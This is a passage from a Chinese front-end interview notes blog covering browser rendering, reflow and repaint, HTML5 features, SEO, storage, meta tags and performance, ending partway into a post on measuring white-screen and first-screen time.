总结：同步——加载和执行都会阻塞，异步——加载不阻塞，执行阻塞，延迟——加载不阻塞，渲染反过来阻塞执行 详细资料可以参考： 《defer 和 async 的区别》 20. 什么是文档的预解析？（浏览器解析过程） Webkit 和 Firefox 都做了这个优化，当执行 JavaScript脚本时，加载另一个线程解析剩下的文档，并加载后面需要通过网络加载的资源。这种方式可以使资源并行加载从而使整体速度更快。需要注意的是，预解析并不改变DOM 树，它将这个工作留给主解析过程，自己只解析外部资源的引用，比如外部脚本、样式表及图片 21. CSS 如何阻塞文档解析？（浏览器解析过程） 理论上，既然样式表不改变 DOM 树，也就没有必要停下文档的解析等待它们，然而，存在一个问题，JavaScript 脚本执行时可能在文档的解析过程中请求样式信息，如果样式还没有加载和解析，脚本将得到错误的值，显然这将会导致很多问题。 所以如果浏览器尚未完成 CSSOM 的下载和构建，而我们却想在此时运行脚本，那么浏览器将延迟 JavaScript 脚本执行和文档的解析，直至其完成 CSSOM 的下载和构建。也就是说，在这种情况下，浏览器会先下载和构建 CSSOM，然后再执行 JavaScript，最后再继续文档的解析。 22. 渲染页面时常见哪些不良现象？（浏览器渲染过程） FOUC：主要指的是样式闪烁的问题，由于浏览器渲染机制（比如firefox），在 CSS 加载之前，先呈现了 HTML，就会导致展示出无样式内容，然后样式突然呈现的现象。会出现这个问题的原因主要是 css 加载时间过长，或者 css 被放在了文档底部。 白屏：有些浏览器渲染机制（比如chrome）要先构建 DOM 树和 CSSOM 树，构建完成后再进行渲染，如果 CSS 部分放在 HTML尾部，由于 CSS 未加载完成，浏览器迟迟未渲染，从而导致白屏；也可能是把 js 文件放在头部，脚本的加载会阻塞后面文档内容的解析，从而页面迟迟未渲染出来，出现白屏问题。 详细资料可以参考： 《前端魔法堂：解秘 FOUC》 《白屏问题和 FOUC》 23. 如何优化关键渲染路径？（浏览器渲染过程） 为尽快完成首次渲染，我们需要最大限度减小以下三种可变因素： （1）关键资源的数量。 （2）关键路径长度。（3）关键字节的数量。 关键资源是可能阻止网页首次渲染的资源。这些资源越少，浏览器的工作量就越小，对 CPU 以及其他资源的占用也就越少。 同样，关键路径长度受所有关键资源与其字节大小之间依赖关系图的影响：某些资源只能在上一资源处理完毕之后才能开始下载，并且资源越大，下载所需的往返次数就越多。 最后，浏览器需要下载的关键字节越少，处理内容并让其出现在屏幕上的速度就越快。要减少字节数，我们可以减少资源数（将它们删除或设为非关键资源），此外还要压缩和优化各项资源，确保最大限度减小传送大小。 优化关键渲染路径的常规步骤如下： （1）对关键路径进行分析和特性描述：资源数、字节数、长度。（2）最大限度减少关键资源的数量：删除它们，延迟它们的下载，将它们标记为异步等。（3）优化关键字节数以缩短下载时间（往返次数）。（4）优化其余关键资源的加载顺序：您需要尽早下载所有关键资产，以缩短关键路径长度。 详细资料可以参考： 《优化关键渲染路径》 24. 什么是重绘和回流？（浏览器绘制过程） 重绘: 当渲染树中的一些元素需要更新属性，而这些属性只是影响元素的外观、风格，而不会影响布局的操作，比如 background-color，我们将这样的操作称为重绘。 回流：当渲染树中的一部分（或全部）因为元素的规模尺寸、布局、隐藏等改变而需要重新构建的操作，会影响到布局的操作，这样的操作我们称为回流。 常见引起回流属性和方法：任何会改变元素几何信息（元素的位置和尺寸大小）的操作，都会触发回流。 （1）添加或者删除可见的 DOM 元素；（2）元素尺寸改变——边距、填充、边框、宽度和高度（3）内容变化，比如用户在 input 框中输入文字（4）浏览器窗口尺寸改变——resize事件发生时（5）计算 offsetWidth 和 offsetHeight 属性（6）设置 style 属性的值（7）当你修改网页的默认字体时。 回流必定会发生重绘，重绘不一定会引发回流。回流所需的成本比重绘高的多，改变父节点里的子节点很可能会导致父节点的一系列回流。 25. 如何减少回流？（浏览器绘制过程） （1）元素的显示与隐藏使用visible，不用display（2）不要把节点的属性值放在一个循环里当成循环里的变量（3）不要使用 table 布局，可能很小的一个小改动会造成整个 table 的重新布局（4）把 DOM 脱离文档流后修改，例如给父元素设置display：none，修改完之后再改回去（5）不要一条一条地修改 DOM 的样式。使用cssText或className直接修改样式（6）触发css硬件加速：在另一个图层上进行操作，不会影响原图层transform代替topopacityfilters（7）尽量减少对这些属性的访问：offsetTop、offsetLeft、offsetWidth、offsetHeightscrollTop、scrollLeft、scrollWidth、scrollHeightclientTop、clientLeft、clientWidth、clientHeightgetComputedStyle()getBoundingClientRect 26. 为什么操作 DOM 慢？（浏览器绘制过程） 一些 DOM 的操作或者属性访问可能会引起页面的回流和重绘，从而引起性能上的消耗。 27. DOMContentLoaded 事件和 Load 事件的区别 当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，而无需等待样式表、图像和子框架的加载完成。 Load 事件是当所有资源加载完成后触发的 28. HTML5 有哪些新特性、移除了那些元素 HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。 新增的有：绘画 canvas;用于媒介回放的 video 和 audio 元素;本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失;sessionStorage 的数据在浏览器关闭后自动删除;语意化更好的内容元素，比如 article、footer、header、nav、section;表单控件，calendar、date、time、email、url、search;新的技术 webworker, websocket;新的文档属性 document.visibilityState 移除的元素有：纯表现的元素：basefont，big，center，font, s，strike，tt，u;对可用性产生负面影响的元素：frame，frameset，noframes； 29. 如何处理 HTML5 新标签的浏览器兼容问题？ IE8/IE7/IE6 支持通过 document.createElement 方法产生的标签，可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，还需要添加标签默认的样式。 30. 简述一下你对 HTML 语义化的理解？ （1） 用正确的标签做正确的事情。（2） html 语义化让页面的内容结构化，结构更清晰，便于对浏览器、搜索引擎解析;（3） 即使在没有样式 CSS 情况下也以一种文档格式显示，并且是容易阅读的;（4） 搜索引擎的爬虫也依赖于 HTML 标记来确定上下文和各个关键字的权重，利于 SEO ;（5） 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解。 回答： 我认为 html 语义化主要指的是我们应该使用合适的标签来划分网页内容的结构。html 的本质作用其实就是定义网页文档的结构，一个语义化的文档，能够使页面的结构更加清晰，易于理解。这样不仅有利于开发者的维护和理解，同时也能够使机器对文档内容进行正确的解读。 比如说我们常用的 b 标签和 strong 标签，它们在样式上都是文字的加粗，但是 strong 标签拥有强调的语义。对于一般显示来说，可能我们看上去没有差异，但是对于机器来说，就会有很大的不同。如果用户使用的是屏幕阅读器来访问网页的话，使用 strong 标签就会有明显的语调上的变化，而 b 标签则没有。 如果是搜索引擎的爬虫对我们网页进行分析的话，那么它会依赖于 html 标签来确定上下文和各个关键字的权重，一个语义化的文档对爬虫来说是友好的，是有利于爬虫对文档内容解读的，从而有利于我们网站的 SEO 。 从 html5 我们可以看出，标准是倾向于以语义化的方式来构建网页的，比如新增了 header 、footer 这些语义标签，删除了 big 、font 这些没有语义的标签。 31. b 与 strong 的区别和 i 与 em 的区别？ 从页面显示效果来看，被 &lt;b&gt;和 &lt;strong&gt;包围的文字将会被加粗，而被 &lt;i&gt; 和 &lt;em&gt;包围的文字将以斜体的形式呈现。 但是&lt;b&gt; &lt;i&gt;是自然样式标签，分别表示无意义的加粗，无意义的斜体，表现样式为 { font-weight: bolder}，仅有外观的作用，没有语义。此两个标签在HTML4.01 中并不被推荐使用。 而 &lt;em&gt;和 &lt;strong&gt;是语义样式标签。 &lt;em&gt;表示一般的强调文本，而&lt;strong&gt;表示比&lt;em&gt;语义更强的强调文本。 使用阅读设备阅读网页时：&lt;strong&gt;会重(zhong)读，而 &lt;b&gt;是展示强调内容。 32. 前端需要注意哪些 SEOseo:search engine optimization(搜索引擎优化) （1）合理的 title、description、keywords：搜索对着三项的权重逐个减小，title 值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面 title 要有所不同；description 把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面 description 有所不同；keywords 列举出重要关键词即可。 （2）语义化的 HTML 代码，符合 W3C 规范：语义化代码让搜索引擎容易理解网页。 （3）重要内容 HTML 代码放在最前：搜索引擎抓取 HTML 顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容肯定被抓取。 （4）重要内容不要用 js 输出：爬虫不会执行 js 获取内容 （5）少用 iframe：搜索引擎不会抓取 iframe 中的内容 （6）非装饰性图片必须加 alt （7）提高网站速度：网站速度是搜索引擎排序的一个重要指标 （8）少使用行内样式（其实就是尽量减少html文档的非结构内容） 33. HTML5 的离线储存怎么使用，工作原理能不能解释一下？ 在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。 原理：HTML5 的离线存储是基于一个新建的 .appcache 文件的缓存机制（不是存储技术），通过这个文件上的解析清单离线存储资源，这些资源就会像 cookie 一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示。 如何使用： （1）创建一个和 html 同名的 manifest 文件，然后在页面头部像下面一样加入一个 manifest 的属性。 1&lt;html lang=\"en\" manifest=\"index.manifest\"&gt; （2）在如下 cache.manifest 文件的编写离线存储的资源123456789CACHE MANIFEST##v0.11CACHE:js&#x2F;app.jscss&#x2F;style.cssNETWORK:resourse&#x2F;logo.pngFALLBACK:&#x2F; &#x2F;offline.html CACHE: 表示需要离线存储的资源列表，由于包含 manifest 文件的页面将被自动离线存储，所以不需要把html页面自身也列出来。 NETWORK: 表示在它下面列出来的资源只有在在线的情况下才能访问，他们不会被离线存储，所以在离线情况下无法使用这些资源。不过，如果在 CACHE 和 NETWORK 中有一个相同的资源，那么这个资源还是会被离线存储，也就是说 CACHE 的优先级更高。 FALLBACK: 表示如果访问第一个资源失败，那么就使用第二个资源来替换他，比如上面这个文件表示的就是如果访问根目录下任何一个资源失败了，那么就去访问 offline.html 。 （3）在离线状态时，操作 window.applicationCache 进行离线缓存的操作。 如何更新缓存： （1）更新 manifest 文件（2）通过 javascript 操作（3）清除浏览器缓存 注意事项： （1）浏览器对缓存数据的容量限制可能不太一样（某些浏览器设置的限制是每个站点 5MB）。（2）如果 manifest 文件，或者内部列举的某一个文件不能正常下载，整个更新过程都将失败，浏览器继续全部使用老的缓存。（3）引用 manifest 的 html 必须与 manifest 文件同源，在同一个域下。（4）FALLBACK 中的资源必须和 manifest 文件同源。（5）当一个资源被缓存后，该浏览器直接请求这个绝对路径也会访问缓存中的资源。（6）站点中的其他页面即使没有设置 manifest 属性，请求的资源如果在缓存中也从缓存中访问。（7）当 manifest 文件发生改变时，资源请求本身也会触发更新。 34. 浏览器是怎么对 HTML5 的离线储存资源进行管理和加载的呢？在线的情况下 浏览器发现 html 头部有 manifest 属性，它会请求 manifest 文件。 如果是第一次访问 app ，那么浏览器就会根据 manifest 文件的内容下载相应的资源并且进行离线存储。 如果已经访问过 app 并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 manifest 文件与旧的 manifest 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。 离线的情况下 浏览器就直接使用离线存储的资源。 注意： 当一个资源被缓存后，该浏览器直接请求这个绝对路径也会访问缓存中的资源。站点中的其他页面即使没有设置 manifest 属性，请求的资源如果在缓存中也从缓存中访问。 35. 常见的浏览器端的存储技术有哪些？ 浏览器常见的存储技术有:cookie、localStorage 和 sessionStorage。 还有两种存储技术用于大规模数据存储:indexDB 36. 请描述一下 cookies，sessionStorage 和 localStorage 的区别？ SessionStorage， LocalStorage， Cookie 这三者都可以被用来在浏览器端存储数据，而且都是字符串类型的键值对 区别 前两者是html5新增的存储技术，而后者是很早就有的,网站为了标识用户身份而存储在用户本地的凭证（通常都会加密） 与服务器的通信：cookie会在每一次同源的http请求当中携带，无论需要与否。而前两者不会在与服务器通信时候携带 大小：cookie有严格的大小限制，一般在4k以内。而前两者通常可以到达5M左右 生命周期：cookie的生命周期由它的expires属性指定过期时间，如果未指定，那么cookie就在一次浏览器会话内有效（cookie过期后会暂时存在，当再次打开页面后浏览器检查cookie过期才会被删除，不是已过期就会自动删除）。sessionStorage在一起浏览器回话内有效。localStorage除非手动删除，否则将一直存在 37. iframe 有那些缺点？ （1） iframe 会阻塞主页面的 onload 事件。window 的 onload 事件需要在所有 iframe 加载完毕后（包含里面的元素）才会触发。在 Safari 和 Chrome 里，通过 JavaScript 动态设置 iframe 的 src 可以避免这种阻塞情况。 （2） 搜索引擎的检索程序无法解读这种页面，不利于网页的 SEO 。 （3） iframe 和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 （4）对于小型移动设备的兼容性较差 38. Label 的作用是什么？是怎么用的？ label 标签来定义表与单控的关系，当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。 12&lt;label for=\"Name\"&gt;Number:&lt;/label&gt;&lt;input type=“text“ name=\"Name\" id=\"Name\"/&gt; 39. HTML5 的 form 的自动完成功能是什么？ autocomplete 属性规定输入字段是否应该启用自动完成功能。默认为启用，设置为 autocomplete=off 可以关闭该功能。 自动完成允许浏览器预测对字段的输入。当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项。 autocomplete 属性适用于 &lt;form&gt;，以及下面的 &lt;input&gt;类型：text, search, url, telephone, email, password,datepickers, range 以及 color。 40. 如何实现浏览器内多个标签页之间的通信? （1）使用 WebSocket，通信的标签页连接同一个服务器，发送消息到服务器后，服务器推送消息给所有连接的客户端。 （2）可以调用 localStorage、cookies 等本地存储方式，localStorge 另一个浏览上下文里被添加、修改或删除时，它都会触发一个 storage 事件，我们通过监听 storage 事件，控制它的值来进行页面信息通信； （3）如果我们能够获得对应标签页的引用，通过 postMessage 方法也是可以实现多个标签页通信的。 41. webSocket 如何兼容低版本浏览器？ Adobe Flash Socket 、ActiveX HTMLFile (IE) 、基于 multipart 编码发送 XHR 、基于长轮询的 XHR 42. 页面可见性（Page Visibility API） 可以有哪些用途？ 这个新的 API 的意义在于，通过监听网页的可见性，可以预判网页的卸载，还可以用来节省资源，减缓电能的消耗。比如，一旦用户不看网页，下面这些网页行为都是可以暂停的。（1）对服务器的轮询（2）网页动画（3）正在播放的音频或视频 43. 如何在页面上实现一个圆形的可点击区域？ （1）纯 html 实现，使用 &lt;area&gt;来给 &lt;img&gt;图像标记热点区域的方式元素永远嵌套在 map 元素内部，我们可以将 area 区域设置为圆形，从而实现可点击的圆形区域。123456789&#96;&#96;&#96;html&lt;img src&#x3D;&quot;planets.gif&quot; width&#x3D;&quot;145&quot; height&#x3D;&quot;126&quot; alt&#x3D;&quot;Planets&quot; usemap&#x3D;&quot;##planetmap&quot;&gt;&lt;map name&#x3D;&quot;planetmap&quot;&gt; &lt;area shape&#x3D;&quot;rect&quot; coords&#x3D;&quot;0,0,82,126&quot; alt&#x3D;&quot;Sun&quot; href&#x3D;&quot;sun.htm&quot;&gt; &lt;area shape&#x3D;&quot;circle&quot; coords&#x3D;&quot;90,58,3&quot; alt&#x3D;&quot;Mercury&quot; href&#x3D;&quot;mercur.htm&quot;&gt; &lt;area shape&#x3D;&quot;circle&quot; coords&#x3D;&quot;124,58,8&quot; alt&#x3D;&quot;Venus&quot; href&#x3D;&quot;venus.htm&quot;&gt;&lt;&#x2F;map&gt; （2）纯 css 实现，使用 border-radius ，当 border-radius 的长度等于宽高相等的元素值的一半时，即可实现一个圆形的点击区域。 （3）纯 js 实现，判断一个点在不在圆上的简单算法，通过监听文档的点击事件，获取每次点击时鼠标的位置，判断该位置是否在我们规定的圆形区域内。 44. 实现不使用 border 画出 1 px 高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。1&lt;div style=\"height:1px;overflow:hidden;background:red\"&gt;&lt;/div&gt; 45. title 与 h1 的区别？ title 属性没有明确意义,它由于是不可见元素，因此不会出现在页面当中。但是通常会出现在浏览器的tab标签页上 h1 则表示层次明确的标题，会出现在页面当中 搜索引擎在抓取网页的时候，title权重最高，会优先分析，而在之后才会解析到文章的标题。 两者对于网页的抓取都有很大的影响 46. &lt;img&gt;的 title 和 alt 有什么区别？ title 通常当鼠标滑动到元素上的时候显示 alt 是 &lt;img&gt;的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，良好的seo要求:除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。 47. Canvas 和 SVG 有什么区别？ Canvas 是一种通过 JavaScript 来绘制 2D 图形的方法。Canvas 是逐像素来进行渲染的，因此当我们对 Canvas 进行缩放时，会出现锯齿或者失真的情况。 SVG 是一种使用 XML 描述 2D 图形的语言。SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。我们可以为某个元素附加 JavaScript 事件监听函数。并且 SVG 保存的是图形的绘制方法，因此当 SVG 图形缩放时并不会失真。 48. 网页验证码是干嘛的，是为了解决什么安全问题？ （1）区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水 （2）有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试 49. 渐进增强和优雅降级的定义 渐进增强：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级：一开始就根据高版本浏览器构建完整的功能，然后再针对低版本浏览器进行兼容。 50. attribute 和 property 的区别是什么？ attribute 是 dom 元素在文档中作为 html 标签拥有的属性；property 就是 dom 元素在 js 中作为JS对象拥有的属性。 对于 html 的标准属性来说，attribute 和 property 是同步的，是会自动更新的，但是对于自定义的属性来说，他们是不同步的。 51. 对 web 标准、可用性、可访问性的理解 可用性（Usability）：产品是否容易上手，用户能否完成任务，效率如何，以及这过程中用户的主观感受可好，是从用户的角度来看产品的质量。可用性好意味着产品质量高，是企业的核心竞争力 可访问性（Accessibility）：Web 内容对于残障用户的可阅读和可理解性 可维护性（Maintainability）：一般包含两个层次，一是当系统出现问题时，快速定位并解决问题的成本，成本低则可维护性好。二是代码是否容易被人理解，是否容易修改和增强功能。 52. IE 各版本和 Chrome 可以并行下载多少个资源？ （1） IE6 2 个并发（2） iE7 升级之后的 6 个并发，之后版本也是 6 个（3） Firefox，chrome 也是6个 53. Flash、Ajax 各自的优缺点，在使用中如何取舍？Flash： （1） Flash 适合处理多媒体、矢量图形、访问机器（2） 对 CSS、处理文本上不足，不容易被搜索 Ajax： （1） Ajax 对 CSS、文本支持很好，支持搜索（2） 多媒体、矢量图形、机器访问不足 共同点： （1） 与服务器的无刷新传递消息（2） 可以检测用户离线和在线状态（3） 操作 DOM 54. 怎么重构页面？ （1） 编写 CSS（2） 让页面结构更合理化，提升用户体验（3） 实现良好的页面效果和提升性能 55. 浏览器架构123456789101112* 用户界面* 主进程* 内核 * 渲染引擎 * JS 引擎 * 执行栈 * 事件触发线程 * 任务队列 * 微任务 * 宏任务 * 网络异步线程 * 定时器线程 56. 常用的 meta 标签1234567891011121314151617181920212223242526272829303132333435&lt;meta&gt; 元素可提供有关页面的元信息（meta-information），比如针对搜索引擎和更新频度的描述和关键词。&lt;meta&gt; 标签位于文档的头部，不包含任何内容。&lt;meta&gt; 标签的属性定义了与文档相关联的名称&#x2F;值对。&lt;!DOCTYPE html&gt; H5标准声明，使用 HTML5 doctype，不区分大小写&lt;head lang&#x3D;”en”&gt; 标准的 lang 属性写法&lt;meta charset&#x3D;’utf-8′&gt; 声明文档使用的字符编码&lt;meta http-equiv&#x3D;”X-UA-Compatible” content&#x3D;”IE&#x3D;edge,chrome&#x3D;1″&#x2F;&gt; 优先使用 IE 最新版本和 Chrome&lt;meta name&#x3D;”description” content&#x3D;”不超过150个字符”&#x2F;&gt; 页面描述&lt;meta name&#x3D;”keywords” content&#x3D;””&#x2F;&gt; 页面关键词&lt;meta name&#x3D;”author” content&#x3D;”name, email@gmail.com”&#x2F;&gt; 网页作者&lt;meta name&#x3D;”robots” content&#x3D;”index,follow”&#x2F;&gt; 搜索引擎抓取&lt;meta name&#x3D;”viewport” content&#x3D;”initial-scale&#x3D;1, maximum-scale&#x3D;3, minimum-scale&#x3D;1, user-scalable&#x3D;no”&gt; 为移动设备添加 viewport&lt;meta name&#x3D;”apple-mobile-web-app-title” content&#x3D;”标题”&gt; iOS 设备 begin&lt;meta name&#x3D;”apple-mobile-web-app-capable” content&#x3D;”yes”&#x2F;&gt; 添加到主屏后的标题（iOS 6 新增）是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏&lt;meta name&#x3D;”apple-itunes-app” content&#x3D;”app-id&#x3D;myAppStoreID, affiliate-data&#x3D;myAffiliateData, app-argument&#x3D;myURL”&gt;添加智能 App 广告条 Smart App Banner（iOS 6+ Safari）&lt;meta name&#x3D;”apple-mobile-web-app-status-bar-style” content&#x3D;”black”&#x2F;&gt;设置苹果工具栏颜色&lt;meta name&#x3D;”format-detection” content&#x3D;”telphone&#x3D;no, email&#x3D;no”&#x2F;&gt; &lt;meta name&#x3D;”renderer” content&#x3D;”webkit”&gt; 启用360浏览器的极速模式(webkit)&lt;meta http-equiv&#x3D;”X-UA-Compatible” content&#x3D;”IE&#x3D;edge”&gt; 避免IE使用兼容模式&lt;meta http-equiv&#x3D;”Cache-Control” content&#x3D;”no-siteapp” &#x2F;&gt; 不让百度转码&lt;meta name&#x3D;”HandheldFriendly” content&#x3D;”true”&gt; 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓&lt;meta name&#x3D;”MobileOptimized” content&#x3D;”320″&gt; 微软的老式浏览器&lt;meta name&#x3D;”screen-orientation” content&#x3D;”portrait”&gt; uc强制竖屏&lt;meta name&#x3D;”x5-orientation” content&#x3D;”portrait”&gt; QQ强制竖屏&lt;meta name&#x3D;”full-screen” content&#x3D;”yes”&gt; UC强制全屏&lt;meta name&#x3D;”x5-fullscreen” content&#x3D;”true”&gt; QQ强制全屏&lt;meta name&#x3D;”browsermode” content&#x3D;”application”&gt; UC应用模式&lt;meta name&#x3D;”x5-page-mode” content&#x3D;”app”&gt; QQ应用模式&lt;meta name&#x3D;”msapplication-tap-highlight” content&#x3D;”no”&gt; windows phone 点击无高光设置页面不缓存&lt;meta http-equiv&#x3D;”pragma” content&#x3D;”no-cache”&gt;&lt;meta http-equiv&#x3D;”cache-control” content&#x3D;”no-cache”&gt;&lt;meta http-equiv&#x3D;”expires” content&#x3D;”0″&gt; 57. css reset 和 normalize.css 有什么区别？ css reset 是最早的一种解决浏览器间样式不兼容问题的方案，它的基本思想是将浏览器的所有样式都重置掉，从而达到所有浏览器样式保持一致的效果。但是使用这种方法，可能会带来一些性能上的问题，并且对于一些元素的不必要的样式的重置，其实反而会造成画蛇添足的效果。 后面出现一种更好的解决浏览器间样式不兼容的方法，就是 normalize.css ，它的思想是尽量的保留浏览器自带的样式，通过在原有的样式的基础上进行调整，来保持各个浏览器间的样式表现一致。相对与 css reset，normalize.css 的方法保留了有价值的默认值，并且修复了一些浏览器的 bug，而且使用 normalize.css 不会造成元素复杂的继承链。 58. 用于预格式化文本的标签是？ 预格式化就是保留文字在源码中的格式 最后显示出来样式与源码中的样式一致 所见即所得。 12345678910111213&#96;&#96;&#96;html&lt;pre&gt; 123 123 123 123123 123&lt;&#x2F;pre&gt;&lt;p&gt; 123 123 123 123123 123&lt;&#x2F;p&gt; 59. DHTML 是什么？ DHTML 将 HTML、JavaScript、DOM 以及 CSS 组合在一起，用于创造动态性更强的网页。通过 JavaScript 和 HTML DOM，能够动态地改变 HTML 元素的样式。 DHTML 实现了网页从 Web 服务器下载后无需再经过服务的处理，而在浏览器中直接动态地更新网页的内容、排版样式和动画的功能。例如，当鼠标指针移到文章段落中时，段落能够变成蓝色，或者当鼠标指针移到一个超级链接上时，会自动生成一个下拉式子链接目录等。 包括： （1）动态内容（Dynamic Content）：动态地更新网页内容，可“动态”地插入、修改或删除网页的元件，如文字、图像、标记等。 （2）动态排版样式（Dynamic Style Sheets）：W3C 的 CSS 样式表提供了设定 HTML 标记的字体大小、字形、样式、粗细、文字颜色、行高度、加底线或加中间横线、缩排、与边缘距离、靠左右或置中、背景图片或颜色等排版功能，而“动态排版样式”即可以“动态”地改变排版样式。 60. head 标签中必不少的是？ 定义文档的标题，它是 head 部分中唯一必需的元素。123## 61. 在 HTML5 中，哪个方法用于获得用户的当前位置？getCurrentPosition()## 62. 文档的不同注释方式？ HTML 的注释方法 CSS 的注释方法 /注释内容/ JavaScript 的注释方法 / 多行注释方式 / //单行注释方式123456789101112## 63. disabled 和 readonly 的区别？&gt; 概念上：disabled 指当 input 元素加载时禁用此元素。readonly 规定输入字段为只读。&gt; 外观上：disabled直接无法聚焦，readonly可以聚焦但是无法输入文字&gt; 表单提交：input 内容不会随着表单提交。input 内容会随着表单提交。相同点：&gt;无论设置 readonly 还是 disabled，通过 js 脚本都能更改 input 的 value## 64. 主流浏览器内核私有属性 css 前缀？mozilla 内核 （irefox,flock 等） -mozwebkit 内核 （safari,chrome 等） -webkitopera 内核 （opera 浏览器） -otrident 内核 （ie 浏览器） -ms` 65. 前端性能优化？第一个方面是页面的内容方面 （1）通过文件合并、css 雪碧图、使用 base64 等方式来减少 HTTP 请求数，避免过多的请求造成等待的情况。 （2）通过 DNS 缓存等机制来减少 DNS 的查询次数。 （3）通过设置缓存策略，对常用不变的资源进行缓存。 （4）使用延迟加载的方式，来减少页面首屏加载时需要请求的资源。延迟加载的资源当用户需要访问时，再去请求加载。 （5）通过用户行为，对某些资源使用预加载的方式，来提高用户需要访问资源时的响应速度。 第二个方面是服务器方面 （1）使用 CDN 服务，来提高用户对于资源请求时的响应速度。 （2）服务器端启用 Gzip、Deflate 等方式对于传输的资源进行压缩，减小文件的体积。 （3）尽可能减小 cookie 的大小，并且通过将静态资源分配到其他域名下，来避免对静态资源请求时携带不必要的 cookie 第三个方面是 CSS 和 JavaScript 方面 （1）把样式表放在页面的 head 标签中，减少页面的首次渲染的时间。 （2）避免使用 @import 标签。 （3）尽量把 js 脚本放在页面底部或者使用 defer 或 async 属性，避免脚本的加载和执行阻塞页面的渲染。 （4）通过对 JavaScript 和 CSS 的文件进行压缩，来减小文件的体积。 66. 扫描二维码登录网页是什么原理，前后两个事件是如何联系的？ 核心过程应该是：浏览器获得一个临时 id，通过长连接等待客户端扫描带有此 id 的二维码后，从长连接中获得客户端上报给 server的帐号信息进行展示。并在客户端点击确认后，获得服务器授信的令牌，进行随后的信息交互过程。在超时、网络断开、其他设备上登录后，此前获得的令牌或丢失、或失效，对授权过程形成有效的安全防护。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"首屏时间和白屏时间","slug":"首屏时间和白屏时间","date":"2020-03-15T16:00:00.000Z","updated":"2024-05-25T04:21:29.244Z","comments":true,"path":"2020/03/16/首屏时间和白屏时间/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/16/%E9%A6%96%E5%B1%8F%E6%97%B6%E9%97%B4%E5%92%8C%E7%99%BD%E5%B1%8F%E6%97%B6%E9%97%B4/","excerpt":"首屏和白屏时间的区别","text":"首屏和白屏时间的区别 白屏时间是指浏览器从响应用户输入网址地址，到浏览器开始显示内容的时间。首屏时间是指浏览器从响应用户输入网络地址，到首屏内容渲染完成的时间。 白屏时间 = 地址栏输入网址后回车 - 浏览器出现第一个元素首屏时间 = 地址栏输入网址后回车 - 浏览器第一屏渲染完成 影响白屏时间的因素：网络，服务端性能，前端页面结构设计。影响首屏时间的因素：白屏时间，资源下载执行时间。 白屏时间通常认为浏览器开始渲染 &lt;body&gt; 或者解析完 &lt;head&gt; 的时间是白屏结束的时间点。 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;白屏&lt;/title&gt; &lt;script&gt; // 不兼容 performance.timing 的浏览器 window.pageStartTime = Date.now() &lt;/script&gt; &lt;!-- 页面 CSS 资源 --&gt; &lt;link rel=\"stylesheet\" href=\"xx.css\"&gt; &lt;link rel=\"stylesheet\" href=\"zz.css\"&gt; &lt;script&gt; // 白屏结束时间 window.firstPaint = Date.now() // 白屏时间 console.log(firstPaint - performance.timing.navigationStart) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello World&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 白屏时间 = firstPaint - performance.timing.navigationStart || pageStartTime 首屏时间计算首屏时间常用的方法有： (1) 首屏模块标签标记法 由于浏览器解析 HTML 是按照顺序解析的，当解析到某个元素的时候，你觉得首屏完成了，就在此元素后面加入 script 计算首屏完成时间。 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;首屏&lt;/title&gt; &lt;script&gt; // 不兼容 performance.timing 的浏览器 window.pageStartTime = Date.now() &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 首屏可见内容 --&gt; &lt;div class=\"\"&gt;&lt;/div&gt; &lt;!-- 首屏可见内容 --&gt; &lt;div class=\"\"&gt;&lt;/div&gt; &lt;script type=\"text/javascript\"&gt; // 首屏屏结束时间 window.firstPaint = Date.now() // 首屏时间 console.log(firstPaint - performance.timing.navigationStart) &lt;/script&gt; &lt;!-- 首屏不可见内容 --&gt; &lt;div class=\"\"&gt;&lt;/div&gt; &lt;!-- 首屏不可见内容 --&gt; &lt;div class=\"\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; (2) 